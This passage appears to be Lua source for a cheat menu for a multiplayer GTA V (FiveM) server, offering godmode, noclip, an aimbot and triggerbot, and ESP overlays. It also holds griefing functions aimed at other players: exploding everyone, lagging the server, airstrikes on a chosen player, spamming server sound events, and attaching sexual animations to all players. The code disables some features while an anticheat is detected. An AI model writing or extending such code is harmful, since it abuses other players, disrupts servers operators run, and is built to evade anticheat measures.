                    SetEntityCanBeDamaged(me, true)
                    if GetEntityHealth(me) < GetEntityMaxHealth(me) - 25 then
                        SetTimeout(250, function()
                            SetEntityHealth(me, GetEntityMaxHealth(me))
                        end)
                    end
                    if IsPedDeadOrDying(me) or IsPedFatallyInjured(me) then
                        Wait(2500)
                        local coords = GetEntityCoords(me)
                        NetworkResurrectLocalPlayer(coords, GetEntityHeading(me), true, false)
                        ClearPedBloodDamage(me)
                        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
                        StopScreenEffect('DeathFailOut')
                    end
                end
            elseif k == 'Max fuel' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        if DoesEntityExist(vehicle) then
                            if GetVehicleFuelLevel(vehicle) <= 50.0 then
                                SetVehicleFuelLevel(vehicle, math.random(7500, 10000) / 100)
                            end
                        end
                    end
                end
            elseif k == 'Insta brake [SPACE + S]' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        if DoesEntityExist(vehicle) then
                            if IsControlPressed(0, 72) and IsControlPressed(0, 76) then
                                SetVehicleForwardSpeed(vehicle, 0.0)
                            end
                        end
                    end
                end
            elseif k == 'Crosshair' then
                if v then
                    DrawRect(0.5, 0.5, 0.006, 0.004, 0, 0, 0, 255)
                    DrawRect(0.5, 0.5, 0.002, 0.011, 0, 0, 0, 255)

                    DrawRect(0.5, 0.5, 0.0045, 0.001, table.unpack(RGB(0.1)))
                    DrawRect(0.5, 0.5, 0.001, 0.008, table.unpack(RGB(0.1)))
                end
            elseif k == 'PlayerBlips' then
                if v then

                    if math.random(1, 1000) == 25 then
                        LoadBlips()
                        print('Reloaded blips')
                    end

                    for k, v in pairs(playerblips) do
                        local pped = GetPlayerPed(k)
                        if pped then
                            if DoesEntityExist(pped) then
                                if friends[GetPlayerServerId(k)] then
                                    SetBlipFriend(v, true)
                                    SetBlipColour(v, 0)
                                else
                                    SetBlipFriend(v, false)
                                    SetBlipColour(v, 0)
                                end
                                SetBlipCoords(v, GetEntityCoords(pped))
                            else
                                if DoesBlipExist(v) then
                                    RemoveBlip(v)
                                    playerblips[k] = false
                                end
                            end
                        else
                            if DoesBlipExist(v) then
                                RemoveBlip(v)
                                playerblips[k] = false
                            end
                        end
                    end
                end
            elseif k == 'Noclip' then
                if v then
                    local x, y, z = table.unpack(GetEntityCoords(me, true))

                    local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(PlayerPedId())
                    local pitch = GetGameplayCamRelativePitch()
                    
                    local dx = -math.sin(heading * math.pi / 180.0)
                    local dy = math.cos(heading * math.pi / 180.0)
                    local dz = math.sin(pitch * math.pi / 180.0)
                    
                    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                    if len ~= 0 then
                        dx = dx/len
                        dy = dy/len
                        dz = dz/len
                    end
                                    
                    local speed = 2.0
                
                    SetEntityVelocity(me, 0.0001, 0.0001, 0.0001)

                    if IsControlPressed(0, 21) then
                        speed = speed + 10
                    end

                    if IsControlPressed(0, 19) then
                        speed = 0.5
                    end

                    if IsControlPressed(0, 32) then
                        x = x + speed * dx
                        y = y + speed * dy
                        z = z + speed * dz
                    end
                
                    if IsControlPressed(0, 269) then
                        x = x - speed * dx
                        y = y - speed * dy
                        z = z - speed * dz
                    end
                    SetEntityCoordsNoOffset(me, x, y, z, true, true, true)
                end
            elseif k == 'Infinite stamina' then
                if v then
                    ResetPlayerStamina(PlayerId())
                end
            elseif k == 'No ragdoll' then
                if v then
                    if not anticheatrunning then
                        SetPedCanBeKnockedOffVehicle(me, false)	
                        SetPedCanRagdoll(me, false)
                        SetPedCanRagdollFromPlayerImpact(me, false)
                        SetPedRagdollOnCollision(me, false)
                        SetPedCanBeDraggedOut(me, false)
                    else
                        Toggles[k] = false
                        AnticheatWarning()
                    end
                else
                    SetPedCanRagdoll(me, true)
                end
            elseif k == 'Super run' then
                if v then
                    if anticheatrunning then
                        Toggles[k] = false
                        AnticheatWarning()
                    else
                        ResetPlayerStamina(PlayerId())
                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                        SetPedMoveRateOverride(me, 5.0)
                    end
                else
                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                    SetPedMoveRateOverride(me, 1.0)
                end
            elseif k == 'Super jump' then
                if v then
                    if anticheatrunning then
                        Toggles[k] = false
                        AnticheatWarning()
                    else
                        SetSuperJumpThisFrame(PlayerId())
                    end
                end
            elseif k == 'Radar' then
                DisplayRadar(v)
            elseif k == 'Effect' then
                if v == 'drunk' then
                    SetPedConfigFlag(me, 100, true)
                    SetPedIsDrunk(me, true)
                    while not HasAnimSetLoaded('MOVE_M@DRUNK@VERYDRUNK') do
                        RequestAnimSet('MOVE_M@DRUNK@VERYDRUNK')
                        Wait(0)
                    end
                    ShakeGameplayCam('DRUNK_SHAKE', 1.0)
                    SetPedMovementClipset(me, 'MOVE_M@DRUNK@VERYDRUNK', 1)
                    SetTimecycleModifier('Drunk')
                    SetPedMotionBlur(me, true)
                elseif v == 'high' then
                    SetPedConfigFlag(me, 100, true)
                    SetPedIsDrunk(me, true)
                    while not HasAnimSetLoaded('MOVE_M@DRUNK@VERYDRUNK') do
                        RequestAnimSet('MOVE_M@DRUNK@VERYDRUNK')
                        Wait(0)
                    end
                    ShakeGameplayCam('DRUNK_SHAKE', 1.0)
                    SetPedMovementClipset(me, 'MOVE_M@DRUNK@VERYDRUNK', 1)
                    SetTimecycleModifier('Drunk')
                    SetTimecycleModifierStrength(1.0)
                    StartScreenEffect('DrugsMichaelAliensFight', 50000, 1)
                    StartScreenEffect('DrugsMichaelAliensFightIn', 50000, 1)
                    StartScreenEffect('DrugsTrevorClownsFight', 50000, 1)
                    StartScreenEffect('DrugsTrevorClownsFightIn', 50000, 1)
                end
            elseif k == '🔞 Fuck all players' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        if not anticheatrunning then
                            if not peds[GetPlayerServerId(v)] then
                                local model = GetHashKey('a_m_y_acult_01')
                                while not HasModelLoaded(model) do
                                    Wait(0)
                                    RequestModel(model)
                                end
                        
                                local ped = CreatePed(5, model, GetEntityCoords(pped), GetEntityHeading(pped), true, true)
                                peds[GetPlayerServerId(v)] = ped
                                CreateThread(function()
                                    SetPedDefaultComponentVariation(ped)
                                    SetPedFriendly(ped)
                                    AttachEntityToEntity(ped, pped, 11816, 0.0, -0.5, 0.0, 0.5, 0.5, 0.0, false, false, false, false, 2, false)
                                    while true do
                                        if not IsEntityPlayingAnim(ped, 'rcmpaparazzo_2', 'shag_loop_a', 3) then
                                            while not HasAnimDictLoaded('rcmpaparazzo_2') do 
                                                Wait(0) 
                                                RequestAnimDict('rcmpaparazzo_2') 
                                            end
                                            TaskPlayAnim(ped, 'rcmpaparazzo_2', 'shag_loop_a', 8.0, -8.0, -1, 1, 0, false, false, false)
                                        end
                                        Wait(0)
                                    end
                                end)
                            end
                        else
                            Toggles[k] = false
                            AnticheatWarning()
                        end
                    end
                else
                    for k, v in pairs(peds) do
                        if v then
                            CreateThread(function()
                                while DoesEntityExist(v) do
                                    Wait(0)
                                    while not NetworkHasControlOfEntity(v) do
                                        NetworkRequestControlOfEntity(v)
                                        Wait(0)
                                    end
                                    SetEntityAsMissionEntity(v, true, true)
                                    DeleteEntity(v)
                                    peds[k] = nil
                                end
                            end)
                        end
                    end
                end
            elseif k == 'Explode everyone' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        AddExplosion(GetEntityCoords(pped), 34, 500.0, true, false, false, false)
                    end
                end
            elseif k == 'Lag Server !Danger' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        local particles = {
                            {'scr_indep_fireworks', 'scr_indep_firework_starburst'},
                            {'scr_indep_fireworks', 'scr_indep_firework_shotburst'},
                            {'proj_xmas_firework', 'scr_firework_xmas_spiral_burst_rgw'},
                        }
                        for k, v in pairs(particles) do
                            while not HasNamedPtfxAssetLoaded(v[1]) do 
                                Wait(0) 
                                RequestNamedPtfxAsset(v[1])
                            end
                            UseParticleFxAssetNextCall(v[1])
                            StartNetworkedParticleFxNonLoopedAtCoord(v[2], GetEntityCoords(pped) + vec3(0.0, 0.0, 15.0), 0.0, 180.0, 0.0, 20.0, false, false, false, false)
                        end
    
                        AddExplosion(GetEntityCoords(pped), 34, 500.0, true, false, 0.0)

                        local model = GetHashKey('contender')
                        while not HasModelLoaded(model) do 
                            RequestModel(model)
                            Wait(0)
                        end
                        CreateVehicle(model, GetEntityCoords(pped), GetEntityHeading(pped), true, true)

                        if HasInteractSound and servereventdelay < GetGameTimer() then
                            servereventdelay = GetGameTimer() + 2500
                            TriggerServerEvent('InteractSound_SV:PlayOnAll', interactsoundaudios[math.random(1, #interactsoundaudios)], 1.0)
                        end
                    end
                end
            elseif k == 'Interactsound spammer' then
                if v then
                    if HasInteractSound and servereventdelay < GetGameTimer() then
                        servereventdelay = GetGameTimer() + 2500
                        local randomsound = interactsoundaudios[math.random(1, #interactsoundaudios)]
                        TriggerServerEvent('InteractSound_SV:PlayOnAll', randomsound, 1.0)
                    end
                end
            elseif k == 'Explosive hands' then
                if v then
                    if IsDisabledControlJustReleased(0, 24) and GetSelectedPedWeapon(PlayerPedId()) == -1569615261 then
                        local _, _, _, _, ped = GetRaycastResult(Cast_3dRayPointToPoint(GetEntityCoords(me), GetOffsetFromEntityInWorldCoords(me, 0.0, 1.3, 0.0), 1.0, 12, me, 7))
                        
                        if ped ~= 0 then
                            if ped ~= me then
                                SetTimeout(450, function()
                                    AddExplosion(GetEntityCoords(ped), 34, 100000.0, true, false, 0.0)
                                end)
                            end
                        else
                            SetTimeout(450, function()
                                AddExplosion(GetPedBoneCoords(me, 57005, vec3(0.0, 0.0, 0.0)), 34, 100000.0, true, false, 0.0)
                            end)
                        end
                    end
                end
            elseif k == 'Explosive ammo' then
                if v then
                    if IsPedArmed(me, 7) and IsPedArmed(me, 6) then
                        local x, coords = GetPedLastWeaponImpactCoord(me)
                        if x then
                            AddExplosion(coords, 34, 100000.0, true, false, 0.0)
                        end
                    end
                end
            elseif k == 'Teleport to bullet' then
                if v then
                    local x, coords = GetPedLastWeaponImpactCoord(me)
                    if x then
                        SetTimeout(100, function()
                            SetEntityCoords(me, coords)
                        end)
                    end
                end
            elseif k == 'Show coords' then
                if v then
                    local coords = GetEntityCoords(me)
                    local heading = GetEntityHeading(me)
                    DrawTxt(('~m~X: ~s~%s ~m~Y: ~s~%s ~m~Z: ~s~%s ~m~H: ~s~%s'):format(string.format('%.2f', coords.x), string.format('%.2f', coords.y), string.format('%.2f', coords.z), string.format('%.2f', heading)), 0.0, true, nil, 0.35, 0.5, true, 0.1)
                end
            elseif k == 'Infinite ammo' then
                if v == 'off' then
                    SetPedInfiniteAmmoClip(me, false)
                    for k, weapon in pairs(weapons) do
                        SetPedInfiniteAmmo(me, false, GetHashKey(weapon))
                    end
                elseif v == 'safe' then
                    SetPedInfiniteAmmoClip(me, false)
                    for k, weapon in pairs(weapons) do
                        SetPedInfiniteAmmo(me, false, GetHashKey(weapon))
                    end
                    if GetAmmoInPedWeapon(me, GetSelectedPedWeapon(me)) < 15 then
                        local x, max = GetMaxAmmo(me, GetSelectedPedWeapon(me))
                        AddAmmoToPed(me, GetSelectedPedWeapon(me), max)
                    end
                elseif v == 'infinite ammo' then
                    SetPedInfiniteAmmoClip(me, true)
                    for k, weapon in pairs(weapons) do
                        SetPedInfiniteAmmo(me, true, GetHashKey(weapon))
                    end
                end
            elseif k == '2D BOX' then
                if v then
                    for k, v in pairs(GetActivePlayers()) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        if pped ~= me then
                            if HasEntityClearLosToEntity(PlayerPedId(), pped, 17) then
                                local color = RGB(0.3)
                                if IsPedDeadOrDying(pped) then
                                    color = {215, 0, 15, 255}
                                end
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, -0.9), table.unpack(color))

                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, 0.8), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, 0.8), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, 0.8), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, 0.8), table.unpack(color))

                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, -0.9), table.unpack(color))
                            else
                                local wh = 1.85 / GetDistanceBetweenCoords(GetEntityCoords(me), GetEntityCoords(pped), true)
                                SetDrawOrigin(GetEntityCoords(pped))	
                                local rgb = RGB(0.3)
                                if IsPedDeadOrDying(pped) then
                                    rgb = {215, 0, 15}
                                end
                                DrawRect(0.0, 0.0, wh/3, wh, rgb[1], rgb[2], rgb[3], 55)
                                ClearDrawOrigin()
                            end
                        end
                    end
                end
            elseif k == 'Player Lines' then
                if v then
                    for k, v in pairs(GetActivePlayers()) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        local dist = Toggles['ESP Distance']
                        local allowed = false
                        if dist then
                            if dist ~= 'infinite' then
                                if #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(pped)) <= tonumber(dist) then
                                    allowed = true
                                end
                            else
                                allowed = true
                            end
                        else
                            allowed = true
                        end
                        if allowed then
                            local rgb = RGB(0.3)
                            if IsPedDeadOrDying(pped) then
                                rgb = {215, 0, 15, 255}
                            end
                            DrawLine(GetEntityCoords(me), GetEntityCoords(pped), table.unpack(rgb))
                        end
                    end
                end
            elseif k == 'Names' then
                if v then
                    for k, v in pairs(GetActivePlayers()) do
                        local pped = GetPlayerPed(v)
                        local dist = Toggles['ESP Distance']
                        local allowed = false
                        if dist then
                            if dist ~= 'infinite' then
                                if #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(pped)) <= tonumber(dist) then
                                    allowed = true
                                end
                            else
                                allowed = true
                            end
                        else
                            allowed = true
                        end
                        if allowed then
                            if pped ~= me or Toggles['Include self'] then
                                -- DrawText3D(GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')', GetPedBoneCoords(pped, bones['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                local godmode = GetPlayerInvincible(v)
                                -- local retval, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, p6, p7, drownProof = GetEntityProofs(pped)
                                -- if not godmode then
                                --     godmode = (collisionProof == 1)
                                -- end
                                if IsPedDeadOrDying(pped) then
                                    if godmode then
                                        DrawText3D(GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')\n~r~Dead\n~g~godmode', GetPedBoneCoords(pped, bones['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                        -- DrawText3D('Dead | godmode', GetPedBoneCoords(pped, bones['pelvis'], 0, 0, 0), 0.15)
                                    else
                                        DrawText3D(GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')\n~r~Dead', GetPedBoneCoords(pped, bones['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                        -- DrawText3D('Dead', GetPedBoneCoords(pped, bones['pelvis'], 0, 0, 0), 0.15)
                                    end
                                elseif godmode then
                                    DrawText3D(GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')\n~g~godmode', GetPedBoneCoords(pped, bones['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                    -- DrawText3D('godmode', GetPedBoneCoords(pped, bones['pelvis'], 0, 0, 0), 0.15)
                                else
                                    DrawText3D(GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')', GetPedBoneCoords(pped, bones['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                end
                            end
                        end
                    end
                end
            elseif k == 'Åïmßð†' then
                if v then
                    if IsDisabledControlPressed(0, 24) and IsPedArmed(me, 6) then

                        for k, v in pairs(allplayers) do
                            local pped = GetPlayerPed(v)

                            if pped ~= me then
                                if DoesEntityExist(pped) and not IsPedDeadOrDying(pped) then
                                    if IsEntityVisible(pped) and HasEntityClearLosToEntity(me, pped, 17) then
                                        if IsEntityOnScreen(pped) then
                                            for k, v in pairs(bones) do
                                                local onscreen, x, y = GetScreenCoordFromWorldCoord(table.unpack(GetPedBoneCoords(pped, v, 0, 0, 0)))
                                                local dist = math.abs(0.5 - x) + math.abs(0.5 - y)
                                                if dist <= aimbotfov then
                                                    ClearPedTasks(me)
                                                    if bones[aimbotbone] then
                                                        ShootAtCoord(GetPedBoneCoords(pped, bones[aimbotbone], 0, 0, 0))
                                                    else
                                                        ShootAtCoord(GetPedBoneCoords(pped, GetBoneAimingAt(pped), 0, 0, 0))
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end

                    end
                end
            elseif k == 'Super handling' then
                local vehicle = GetVehiclePedIsUsing(me)
                if vehicle then
                    if DoesEntityExist(vehicle) then
                        if v then
                            SetVehicleGravityAmount(vehicle, 20.0)
                        else
                            SetVehicleGravityAmount(vehicle, 10.0)
                        end
                    end
                end
            elseif k == '†rïggêrßð†' then
                if v then
                    
                    local exists, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if exists then

                        for k, v in pairs(allplayers) do
                            local pped = GetPlayerPed(v)

                            if pped ~= me and pped == entity then
                                if DoesEntityExist(pped) and not IsPedDeadOrDying(pped) then
                                    if IsEntityVisible(pped) then
                                        for k, v in pairs(bones) do
                                            ShootAtCoord(GetPedBoneCoords(pped, GetBoneAimingAt(pped), 0, 0, 0))
                                        end
                                    end
                                end
                            end
                        end

                    end

                end
            elseif k == 'Firework ammo' then
                if v then
                    if IsPedArmed(me, 7) and IsPedArmed(me, 6) then
                        CreateThread(function()
                            local x, coords = GetPedLastWeaponImpactCoord(me)
                            if x then

                                local particles = {
                                    {'proj_indep_firework', 'scr_indep_launcher_sparkle_spawn'},
                                    {'proj_indep_firework_v2', 'scr_xmas_firework_burst_fizzle'},
                                    {'proj_indep_firework_v2', 'scr_firework_indep_burst_rwb'},
                                    {'proj_xmas_firework', 'scr_firework_xmas_ring_burst_rgw'},
                                }

                                for k, v in pairs(particles) do
                                    if v then
                                        if v[1] and v[2] then
                                            while not HasNamedPtfxAssetLoaded(v[1]) do 
                                                Wait(0) 
                                                RequestNamedPtfxAsset(v[1])
                                            end
                                            UseParticleFxAssetNextCall(v[1])
                                            StartNetworkedParticleFxNonLoopedAtCoord(v[2], coords + vec3(0.0, 0.0, 3.5), 0.0, 180.0, 0.0, 20.0, false, false, false, false)
                                        end
                                    end
                                end

                            end

                        end)
                    end
                end
            elseif k == 'Show åïmßð† fov' then
                if v then
                    DrawRect(0.5, 0.5, aimbotfov, aimbotfov * 1.78, 45, 45, 45, 75)
                end
            elseif k == '§þïñßð†' then
                if v then
                    if not (IsControlPressed(0, 32) or IsControlPressed(0, 33) or IsControlPressed(0, 34) or IsControlPressed(0, 35) or IsPedInAnyVehicle(me, false)) then
                        SetEntityHeading(me, GetEntityHeading(me) + 5)
                    end
                end
            elseif k == 'Neon RGB' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        SetVehicleNeonLightsColour(vehicle, table.unpack(RGB(0.2)))
                    end
                end
            elseif k == 'Paintjob RGB' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        SetVehicleCustomPrimaryColour(vehicle, table.unpack(RGB(0.2)))
                        SetVehicleCustomSecondaryColour(vehicle, table.unpack(RGB(0.2)))
                    end
                end
            elseif k == 'Boost vehicle' then
                local vehicle = GetVehiclePedIsUsing(me)
                if vehicle then
                    if v then
                        SetVehicleEnginePowerMultiplier(vehicle, tonumber(v) / 1)
                    else
                        SetVehicleEnginePowerMultiplier(vehicle, 0.0)
                    end
                end
            elseif k == 'Speedometer' then
                local vehicle = GetVehiclePedIsUsing(me)
                if DoesEntityExist(vehicle) then
                    local kmh = math.floor(GetEntitySpeed(vehicle) * 3.6)
                    local color = '~s~'
                    if kmh > 100 then
                        color = '~o~'
                        if kmh > 200 then
                            color = '~r~'
                        end
                    end
                    if v == 'km/h' then
                        local kmh = math.floor(GetEntitySpeed(vehicle) * 3.6)
                        DrawTxt(('%s%s ~s~km/h'):format(color, kmh), 0.95, false, {210, 210, 210}, 0.3, 0.9, true, 0.1)
                    elseif v == 'mph' then
                        local mph = math.floor(GetEntitySpeed(vehicle) * 2.236936)
                        DrawTxt(('%s%s ~s~mph'):format(color, mph), 0.95, false, {210, 210, 210}, 0.3, 0.9, true, 0.1)
                    end
                end
            end
        end
        Wait(0)
    end
end)

local Menus = {
    {MenuTitle, 1},
    {'~u~SELF MENU', 2, 1},
    {'~u~MENU OPTIONS', 3, 1},
    {'~u~SERVER RESOURCES', 4, 3},
    {'~u~DESTROY SERVER', 5, 1},
    {'~u~SERVER MENU', 6, 1},
    {'~u~WEAPON OPTIONS', 7, 1},
    {'~u~ESP MENU', 8, 1},
    {'~u~PLAYER LIST', 9, 1},
    {'~u~LOADING...', 10, 9},
    {'~u~ESX', 11, 1},
    {'~u~VEHICLE MENU', 12, 1},
    {'~u~DRIVE TO WAYPOINT', 13, 12},
    {'~u~LOS SANTOS CUSTOMS', 14, 12},
    {'~u~LSC - COSMETICS', 15, 14},
    {'~u~LSC - PERFORMANCE', 16, 14},
    {'~u~VEHICLE SPAWNER', 17, 12},
    {'~u~WEATHER MENU', 18, 1},
    {'~u~WEAPON CUSTOMIZATION', 19, 7},
    {'~u~RESOURCE INFO', 20, 4},
    {'~u~TELEPORT MENU', 21, 2},
    {'~u~ANIMATIONS MENU', 22, 2},
    {'~u~INTERACTSOUND MENU', 23, 6},
    {'~u~PED MENU', 24, 1},
    {'~u~WEAPON AMMO', 25, 7},
    {'~u~FREECAM MENU', 26, 2}
}

local SetMenuData = function(data)
    if data['Type'] == 'toggle' then
        rgbenabled = data['Enabled']
    elseif data['Type'] == 'list' then
        if string.find(data['Text'], 'Red') then
            menucolours[1] = data['Current'] - 1
        elseif string.find(data['Text'], 'Green') then
            menucolours[2] = data['Current'] - 1
        elseif string.find(data['Text'], 'Blue') then
            menucolours[3] = data['Current'] - 1
        elseif string.find(data['Text'], 'Alpha') then
            menucolours[4] = data['Current'] - 1
        elseif string.find(data['Text'], 'Delay') then
            menudelay = tonumber(data['Items'][data['Current']])
        end
    end
end

local OnlinePlayer = function(data)
    local pped = GetPlayerPed(GetPlayerFromServerId(currentplayer))
    if data['Text'] == 'Teleport' then
        SetEntityCoords(PlayerPedId(), GetEntityCoords(pped))
        local timer = GetGameTimer() + 5000
        while not HasCollisionLoadedAroundEntity(pped) do
            if timer < GetGameTimer() then
                break
            end
            Wait(0)
            SetEntityCoords(PlayerPedId(), GetEntityCoords(pped))
        end
    elseif data['Text'] == 'Remove all weapons' then
        RemoveAllPedWeapons(pped)
    elseif data['Text'] == 'Give all weapons' then
        for k, v in pairs(weapons) do
            GiveWeaponToPed(pped, GetHashKey(v), 250, false, false)
        end
    elseif data['Text'] == 'Give weapons' then
        GiveWeaponToPed(pped, GetHashKey(data['Items'][data['Current']]), 250, false, false)
    elseif data['Text'] == 'Explode' then
        if data['Items'][data['Current']] == 'silent' then
            AddExplosion(GetEntityCoords(pped), 34, 500.0, false, true, false, false)
        else
            AddExplosion(GetEntityCoords(pped), 34, 500.0, true, false, false, false)
        end
    elseif data['Text'] == 'Give Health' then
        CreatePickup(GetHashKey('PICKUP_HEALTH_STANDARD'), GetEntityCoords(pped))
    elseif data['Text'] == 'Give Armour' then
        CreatePickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), GetEntityCoords(pped))
    elseif data['Text'] == 'Bring vehicle' then
        CreateThread(function()
            local vehicle = GetVehiclePedIsIn(pped)
            while not NetworkHasControlOfEntity(vehicle) do
                NetworkRequestControlOfEntity(vehicle)
                Wait(0)
            end
            for i = 0, 100 do
                SetEntityCoords(vehicle, GetEntityCoords(PlayerPedId()) + vec3(0.0, 0.0, 3.0))
                Wait(5)
            end
        end)
    elseif data['Text'] == 'Kick from vehicle' then
        ClearPedTasksImmediately(pped)
    elseif data['Text'] == 'ESX Revive' then
        TriggerServerEvent('esx_ambulancejob:revive', currentplayer, currentplayer)
    elseif data['Text'] == 'Destroy vehicle' then
        CreateThread(function()
            local vehicle = GetVehiclePedIsIn(pped)
            while not NetworkHasControlOfEntity(vehicle) do
                NetworkRequestControlOfEntity(vehicle)
                Wait(0)
            end
            NetworkRequestControlOfEntity(vehicle)
            SetVehicleUndriveable(vehicle, true)
            SetVehicleEngineHealth(vehicle, 0)
            Wait(100)
        end)
    elseif data['Text'] == 'Airstrike' then
        if not anticheatrunning then
            CreateThread(function()
                local attack = function(SpawnPosition)
                    local model = GetHashKey('lazer')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local plane = CreateVehicle(model, SpawnPosition, GetEntityHeading(pped), true, true)
                    ControlLandingGear(plane, 1)
                    local model = GetHashKey('u_m_y_abner')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local pilot = CreatePedInsideVehicle(plane, 4, model, -1, true, true)
                    
                    local closethread = GetGameTimer() + 999999
                    local closing = false

                    while true do
                        Wait(750)
                        TaskVehicleDriveToCoord(pilot, plane, GetEntityCoords(pped), 9999.0, 0, GetHashKey('lazer'), 16777216, 1.0, 1)

                        if #(GetEntityCoords(pped).xy - GetEntityCoords(plane).xy) <= 450.0 then
                            if not closing then
                                closing = true
                                closethread = GetGameTimer() + 5000
                            end
                            ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(plane, 0.0, 0.0, -30.0), GetOffsetFromEntityInWorldCoords(pped, 0.0, math.random(-5, 5), -5.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_SPACE_ROCKET"), pilot, true, false, 9000.0)
                        end
                        if closethread <= GetGameTimer() then
                            DeleteEntity(plane)
                            DeleteEntity(pilot)
                            return
                        end
                    end
                end
                for k, v in pairs({
                    vec2(0.0, -1000.0),
                    vec2(0.0, 1000.0),
                    vec2(1000.0, 0.0),
                    vec2(-1000.0, 0.0),
                    vec2(-1000.0, 1000.0),
                    vec2(1000.0, -1000.0),
                    vec2(1000.0, 1000.0),
                    vec2(-1000.0, -1000.0)
                }) do
                    CreateThread(function()
                        attack(GetOffsetFromEntityInWorldCoords(pped, v['x'], v['y'], 1000.0))
                    end)
                    Wait(250)
                end
            end)
        else
            AnticheatWarning()
        end
    elseif data['Text'] == 'Spectate' then
        spectating = true
        currentlyspectating = currentplayer
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'spectat') then
                v['Text'] = 'Stop spectating'
            end
        end

        DestroyCam(cam)
        ClearTimecycleModifier()
        RenderScriptCams(false, false, 0, 1, 0)

        cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
        RenderScriptCams(1, 0, 0, 1, 1)
        SetCamActive(cam, true)
        SetFocusEntity(pped)
    
        local offsetRotX = 0.0
        local offsetRotY = 0.0
        local offsetRotZ = 0.0

        CreateThread(function()
            local currOffset = vec3(0.0, -4.0, 3.0)
            while spectating do
                Wait(0)

                -- local offset = offsetRotZ / 18.0
                -- if offset > 10.5 then 
                --     offset = offset - 21
                -- elseif offset < -10.5 then
                --     offset = offset + 21
                -- end

                -- print(offset)

                -- local height = (offsetRotX / 10.0) * -1
                -- local coords = GetEntityCoords(maincar)
                -- local success, groundz = GetGroundZFor_3dCoord(coords.x, coords.y, coords.z, true)
                -- local customforward = 0.0

                -- if success then
                --     if GetOffsetFromEntityInWorldCoords(maincar, 0.0, 0.0, height).z - groundz < 0.0 then
                --         customforward = height * -1
                --         if customforward > 1.75 then customforward = 1.75 end
                --         height = (groundz - GetEntityCoords(maincar).z)
                --     end
                -- end
                
                -- height = height + 0.25

                -- if height > 2.0 then 
                --     customforward = height - 2.0
                --     if customforward > 3.0 then customforward = 3.0 end
                --     height = 2.0 
                -- end

                -- if offset > 3.0 then
